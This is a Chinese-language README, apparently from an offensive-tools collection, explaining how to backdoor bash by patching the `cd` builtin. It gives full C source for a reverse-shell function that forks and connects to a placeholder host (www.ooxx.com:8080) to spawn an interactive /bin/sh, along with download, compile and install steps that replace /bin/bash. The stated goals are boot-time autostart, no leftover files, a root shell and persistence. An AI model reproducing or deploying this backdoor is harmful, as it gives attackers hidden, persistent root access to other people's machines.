## Bash版反弹shell后门

参考笔者在reverse_shell模块中写的各种反弹shell，一时脑洞大开，如何才能做到开机自启动
而又不会在系统中留下痕迹呢？经过笔者仔细对Linux系统启动流程的研究，发现在某些服务（或这进程）在开启的时候会调用`cd`命令,于是就想到了hook `cd`命令的想法。于是也就有了这个可以反弹shell的bash后门。

### 特点
> * 开机自启动
> * 不产生任何残留文件
> * 反弹root权限的shell
> * 支持反弹到IP或域名

### 安装

下载bash源码，找到`cd`命令的源码,替换cd.def文件并编译安装:
```shell
wget https://ftp.gnu.org/gnu/bash/bash-4.4-rc1.tar.gz
tar zxvf bash-4.4-rc1.tar.gz
cp ./cd.def ./bash-4.4-rc1/builtins/cd.def
./bash-4.4-rc1/configure
make && make install
```
你也可以在与目标机器相同的本地环境源码编译安装，再将编译到的bash二进制文件替换到/bin/bash即可。但是替换需要root权限，这一步想必你之前应该已经办到了^_^

### Payload
添加如下函数到cd.def文件中：
```c
/* start re_shell function */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
//#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>

int re_shell(){
    pid_t pid;
    if ((pid = fork()) == -1){
        exit(-1);
    }
    if (pid == 0) {   
        setsid();
        char *host = "www.ooxx.com"; //your server ip or domain
        int port = 8080; //conn port

        int sock;
        struct in_addr addr;
        struct hostent *h;
        struct sockaddr_in server;

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            exit(-1);
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);

        if(! inet_pton(AF_INET, host, &addr)){
            if((h = gethostbyname(host)) == NULL) {
                exit(-1);
            }
            host = inet_ntoa(*((struct in_addr *)h->h_addr));
        }

        server.sin_addr.s_addr = inet_addr(host);

        if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
            exit(-1);
        }

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        close(sock);
        execl("/bin/sh", "/bin/sh", "-i", NULL);
    }
    return 0;
}

/* end re_shell function */
```
然后将re_shell添加到cd_builtin这个函数（源码Line320）中来:
```c
316 int
317 cd_builtin (list)
318      WORD_LIST *list;
319     {
320         re_shell();
321          
322         char *dirname, *cdpath, *path, *temp;
```
当然在re_shell中，修改你需要反弹shell的远程IP和端口号。完整的cd.def可以参考我的demo。这里只是给出一个简单的示例，其实利用`cd`命令这个开启自启动的特点还可以做很多权限维持方面的东西，读者自由发挥。这里存在的不足是会改变bash二进制文件的md5，像checkroot之类的工具很容易检测到。



